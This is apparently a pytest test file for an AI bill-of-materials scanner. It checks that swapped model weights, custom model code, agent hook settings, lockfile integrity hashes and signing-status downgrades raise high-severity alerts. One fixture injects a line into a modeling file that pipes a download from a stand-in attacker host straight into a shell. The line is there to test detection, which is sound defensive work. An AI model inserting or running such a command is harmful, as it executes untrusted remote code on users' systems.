    write("models/tf/variables/variables.index", b"index")
    write("models/tf/variables/variables.data-00000-of-00001", weights("savedmodel"))
    write("models/onnx/model.onnx", onnx_model(onnx_tensor("w", "model.onnx_data")))
    write("models/onnx/model.onnx_data", weights("onnx"))
    shards = ["model-00001-of-00002.safetensors", "model-00002-of-00002.safetensors"]
    for index, shard in enumerate(shards):
        write_safetensors(root / "models/sharded" / shard, bytes([index + 1]) * 4)
    if swapped == "shard-index":
        shards.reverse()
    index_map = {"metadata": {"total_size": 8}, "weight_map": dict(zip("ab", shards, strict=True))}
    write("models/sharded/model.safetensors.index.json", json.dumps(index_map))
    write_safetensors(root / "models/custom/model.safetensors")
    auto_map = {"AutoModel": "modeling_custom.CustomModel"}
    write("models/custom/config.json", json.dumps({"model_type": "custom", "auto_map": auto_map}))
    code = "class CustomModel:\n    pass\n"
    if swapped == "custom-code":
        code = "import os\n\nos.system('curl https://evil.example | sh')\n" + code
    write("models/custom/modeling_custom.py", code)
    # A bare program word, which the settings digest keeps whole: an argument is digested
    # by shape only, and the keyless gate would then alert on the unbound record too.
    hook = "settings-changed" if swapped == "settings" else "lint"
    hooks = [{"matcher": "Edit", "hooks": [{"type": "command", "command": hook}]}]
    write(".claude/settings.json", json.dumps({"hooks": {"PostToolUse": hooks}}))
    dependencies = {"@modelcontextprotocol/sdk": "1.2.3"}
    write(
        "package.json",
        json.dumps({"name": "demo", "version": "1.0.0", "dependencies": dependencies}),
    )
    integrity = "sha512-" + ("B" if swapped == "lockfile" else "A") * 86 + "=="
    record = {
        "version": "1.2.3",
        "resolved": "https://registry.npmjs.org/@modelcontextprotocol/sdk/-/sdk-1.2.3.tgz",
        "integrity": integrity,
    }
    lock = {
        "name": "demo",
        "version": "1.0.0",
        "lockfileVersion": 3,
        "requires": True,
        "packages": {
            "": {"name": "demo", "version": "1.0.0", "dependencies": dependencies},
            "node_modules/@modelcontextprotocol/sdk": record,
        },
    }
    write("package-lock.json", json.dumps(lock, indent=2))


@pytest.mark.parametrize(
    ("swapped", "changed", "key"),
    [
        ("savedmodel", {"model:models/tf/saved_model.pb"}, "weight_files"),
        ("onnx", {"model:models/onnx/model.onnx"}, "weight_files"),
        (
            "shard-index",
            {
                "model:models/sharded/model-00001-of-00002.safetensors",
                "model:models/sharded/model-00002-of-00002.safetensors",
            },
            "weight_files",
        ),
        ("custom-code", {"model:models/custom/model.safetensors"}, "custom_code"),
        ("settings", {"ide-agent:claude-code"}, "settings_hashes"),
        ("lockfile", {"registry:npm/@modelcontextprotocol/sdk"}, "lockfile_integrity"),
    ],
)
def test_a_digest_swapped_in_properties_is_a_high_alert_that_names_its_key(
    tmp_path, swapped, changed, key
):
    project = tmp_path / "project"
    _digest_bound(project)
    _scan(project, tmp_path / "reviewed.json")
    _digest_bound(project, swapped)
    _scan(project, tmp_path / "candidate.json")
    status, report = _gate(tmp_path / "reviewed.json", tmp_path / "candidate.json")
    assert status == 1, report
    modified = {change["bom_ref"]: change for change in report["components_modified"]}
    assert set(modified) == changed, modified
    for ref in changed:
        assert modified[ref]["severity"] == "high", modified[ref]
        assert f"properties.{key} changed." in modified[ref]["details"], modified[ref]
        (alert,) = [a for a in report["security_alerts"] if a["component"] == ref]
        assert alert["severity"] == "high" and f"properties.{key} changed." in alert["alert"]
        assert "properties changed." not in alert["alert"]
    text = CliRunner().invoke(
        main, ["diff", str(tmp_path / "reviewed.json"), str(tmp_path / "candidate.json")]
    )
    assert any(
        line.startswith("  [HIGH] High change in ") and f"properties.{key} changed." in line
        for line in text.stdout.splitlines()
    ), text.stdout


_SHA256 = "sha256:" + "a" * 64
_SHA256_SWAPPED = "sha256:" + "b" * 64
_SRI = "sha512-" + "A" * 86 + "=="


@pytest.mark.parametrize(
    ("before", "after", "severity", "detail"),
    [
        (
            {"weight_files": [{"path": "m.data", "sha256": _SHA256}]},
            {"weight_files": [{"path": "m.data", "sha256": _SHA256_SWAPPED}]},
            "high",
            "properties.weight_files changed.",
        ),
        (
            {"weight_files": [{"path": "m.data", "sha256": _SHA256}]},
            {},
            "high",
            "properties.weight_files removed.",
        ),
        (
            {"custom_code": {"python_files": [{"sha256": _SHA256}], "references": ["m.A"]}},
            {"custom_code": {"python_files": [{"sha256": _SHA256}], "references": ["m.B"]}},
            "high",
            "properties.custom_code changed.",
        ),
        (
            {"settings_hashes": {".claude/settings.json": _SHA256}},
            {"settings_hashes": {".claude/settings.json": _SHA256_SWAPPED}},
            "high",
            "properties.settings_hashes changed.",
        ),
        (
            {"lockfile_integrity": _SRI},
            {"lockfile_integrity": _SRI.replace("A", "B")},
            "high",
            "properties.lockfile_integrity changed.",
        ),
        (
            {"config": {"files": ["sha384:" + "c" * 96]}},
            {"config": {"files": []}},
            "high",
            "properties.config changed.",
        ),
        (
            {"note": "sha512:" + "d" * 128},
            {"note": "rewritten"},
            "high",
            "properties.note changed.",
        ),
        (
            {"bundle": "unchanged"},
            {"bundle": ["sha256-" + "E" * 43 + "="]},
            "high",
            "properties.bundle changed.",
        ),
        (
            {"static_value_binding": "hmac-sha256:" + "1" * 64},
            {"static_value_binding": "hmac-sha256:" + "2" * 64},
            "high",
            "properties.static_value_binding changed.",
        ),
        (
            {"requirement_hashes": ["one"]},
            {"requirement_hashes": ["two"]},
            "high",
            "properties.requirement_hashes changed.",
        ),
        ({"x_hash": 1}, {"x_hash": 2}, "high", "properties.x_hash changed."),
        ({"x_digest": "a"}, {}, "high", "properties.x_digest removed."),
        ({"x_sha256": "a"}, {"x_sha256": "b"}, "high", "properties.x_sha256 changed."),
        ({"note": "a"}, {"note": "b"}, "medium", "properties.note changed."),
        ({"note": "a"}, {}, "medium", "properties.note removed."),
        ({}, {"lockfile_integrity": _SRI}, "medium", "properties.lockfile_integrity added."),
    ],
)
def test_each_property_change_names_its_key_and_a_digest_rates_high(
    before, after, severity, detail
):
    old = AIBOM(components=[ModelComponent(bom_ref="m", name="m", properties=before)])
    new = AIBOM(components=[ModelComponent(bom_ref="m", name="m", properties=after)])
    (change,) = AIBOMDiffer().diff(old, new).components_modified
    assert (change.severity, change.details) == (severity, [detail])


def test_property_changes_are_listed_digests_first():
    old = ModelComponent(
        bom_ref="m",
        name="m",
        properties={"a_note": 1, "weight_files": [{"sha256": _SHA256}], "z_hash": "1"},
    )
    new = old.model_copy(
        update={"properties": {"a_note": 2, "weight_files": [{"sha256": _SHA256_SWAPPED}]}}
    )
    report = AIBOMDiffer().diff(AIBOM(components=[old]), AIBOM(components=[new]))
    assert report.components_modified[0].details == [
        "properties.weight_files changed.",
        "properties.z_hash removed.",
        "properties.a_note changed.",
    ]
    (alert,) = report.security_alerts
    assert alert["severity"] == "high"
    assert alert["alert"] == (
        "High change in 'm': properties.weight_files changed.; properties.z_hash removed.; "
        "properties.a_note changed."
    )


@pytest.mark.parametrize("count", [100, 1_000, 10_000])
def test_a_flood_of_changed_properties_is_summarized_in_bounded_text(count):
    keys = {f"k{index:06d}": index for index in range(count)}
    old = ModelComponent(bom_ref="m", name="m", properties={**keys, "zz_hash": "a"})
    new = old.model_copy(update={"properties": dict.fromkeys(keys, -1)})
    (change,) = (
        AIBOMDiffer().diff(AIBOM(components=[old]), AIBOM(components=[new])).components_modified
    )
    assert change.severity == "high"
    assert change.details[0] == "properties.zz_hash removed."
    assert len(change.details) == _NAMED_PROPERTIES + 1
    assert change.details[-1] == f"properties: {count + 1 - _NAMED_PROPERTIES} more changed."
    assert sum(map(len, change.details)) < 2_000


def test_an_overlong_property_name_is_clipped_in_the_alert():
    key = "k" * 100_000 + "_hash"
    old = ModelComponent(bom_ref="m", name="m", properties={key: "a"})
    new = old.model_copy(update={"properties": {key: "b"}})
    (change,) = (
        AIBOMDiffer().diff(AIBOM(components=[old]), AIBOM(components=[new])).components_modified
    )
    assert change.severity == "high" and len(change.details[0]) < 300


@pytest.mark.parametrize(
    ("update", "detail"),
    [
        ({"version": "1." + "9" * 100_000}, "Version changed: 1.0 → 1.9"),
        ({"hashes": {"sha256": "sha256:" + "a" * 64, "k" * 100_000: "b"}}, "File hash (kkk"),
    ],
)
def test_an_overlong_value_is_clipped_in_the_change(update, detail):
    old = ModelComponent(
        bom_ref="m", name="m", version="1.0", hashes={"sha256": "sha256:" + "a" * 64}
    )
    (change,) = (
        AIBOMDiffer()
        .diff(AIBOM(components=[old]), AIBOM(components=[old.model_copy(update=update)]))
        .components_modified
    )
    assert [d.startswith(detail) and len(d) < 500 for d in change.details] == [True]


def test_an_overlong_report_location_is_clipped_in_the_note():
    old = CompletenessClaim(scope="shadowscan-imported", source_report_path="a.json")
    new = old.model_copy(update={"source_report_path": "d/" * 100_000 + "a.json"})
    (change,) = _compare(old, new).metadata_changes
    assert change["field"] == "completeness.source_report_path" and len(change["detail"]) < 500


@pytest.mark.parametrize(
    ("before", "after", "severity", "detail"),
    [
        (
            None,
            "sha256:" + "a" * 64,
            "medium",
            "File hash (sha256) became available — first binding of content the baseline "
            "never pinned.",
        ),
        ("sha256:" + "a" * 64, "sha256:" + "b" * 64, "high", "File hash (sha256) changed."),
        ("sha256:" + "a" * 64, None, "high", "File hash (sha256) removed — integrity is unknown."),
    ],
)
def test_a_file_hash_change_says_whether_it_was_added_changed_or_removed(
    before, after, severity, detail
):
    def model(digest):
        return ModelComponent(bom_ref="m", name="m", hashes={"sha256": digest} if digest else {})

    (change,) = (
        AIBOMDiffer().diff(AIBOM(components=[model(before)]), AIBOM(components=[model(after)]))
    ).components_modified
    assert (change.severity, change.details) == (severity, [detail])


def test_a_first_hash_binding_fails_the_drift_gate():
    """Content first pinned after an unhashed baseline is reviewable, so it must alert."""
    old = ModelComponent(bom_ref="m", name="m")
    new = ModelComponent(bom_ref="m", name="m", hashes={"sha256": "sha256:" + "a" * 64})
    report = AIBOMDiffer().diff(AIBOM(components=[old]), AIBOM(components=[new]))
    assert [a["severity"] for a in report.security_alerts] == ["medium"]
    assert "became available" in report.security_alerts[0]["alert"]


@pytest.mark.parametrize(
    ("before", "after", "severity"),
    [
        ("partially-verified", "signature-not-found", "high"),
        ("partially-verified", "verification-failed", "high"),
        ("partially-verified", "signature-present-unverified", "high"),
        ("partially-verified", "verification-unavailable", "high"),
        ("signature-present-unverified", "signature-not-found", "high"),
        ("sigstore-signed", "digest-pinned", "high"),
        ("pgp-signed", "partially-verified", "high"),
        ("signature-not-found", "verification-failed", "high"),
        ("verification-failed", "signature-not-found", "high"),
        ("digest-pinned", None, "high"),
        ("partially-verified", "x-new-status", "high"),
        ("signature-not-found", "partially-verified", "medium"),
        ("signature-present-unverified", "partially-verified", "medium"),
        ("partially-verified", "sigstore-signed", "medium"),
        ("verification-failed", "digest-pinned", "medium"),
        ("x-new-status", "signature-present-unverified", "medium"),
    ],
)
def test_a_signing_status_change_is_high_unless_it_raises_the_status(before, after, severity):
    old = ModelComponent(bom_ref="m", name="m", signing_status=before)
    new = ModelComponent(bom_ref="m", name="m", signing_status=after)
    (change,) = (
        AIBOMDiffer().diff(AIBOM(components=[old]), AIBOM(components=[new])).components_modified
    )
    assert change.severity == severity
    assert change.details == [f"Signing status changed: {before} → {after}"]


@pytest.mark.parametrize("after", ["sha256:" + "f" * 64, None])
def test_a_changed_or_removed_redacted_definition_hash_is_high(after):
    tool = ToolComponent(
        bom_ref="t",
        name="t",
        definition_hash=_SHA256,
        definition_hash_version="rfc8785-jcs-v2",
        redacted_definition_hash=_SHA256_SWAPPED,
    )
    changed = tool.model_copy(update={"redacted_definition_hash": after})
    report = AIBOMDiffer().diff(AIBOM(components=[tool]), AIBOM(components=[changed]))
    (change,) = report.components_modified
    assert (change.severity, change.details) == ("high", ["redacted_definition_hash changed."])
